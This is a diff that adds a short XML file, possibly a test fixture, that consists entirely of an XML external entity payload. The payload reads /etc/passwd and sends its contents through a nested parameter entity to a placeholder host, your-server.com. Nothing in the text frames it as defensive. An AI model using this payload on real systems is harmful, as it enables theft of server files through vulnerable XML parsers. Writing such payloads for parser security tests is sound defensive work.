@@ -1,0 +1,7 @@
+<!DOCTYPE data [
+  <!ENTITY % payload SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://your-server.com/?data=%payload;'>">
+  %eval;
+  %exfil;
+]>
+<data>test</data>
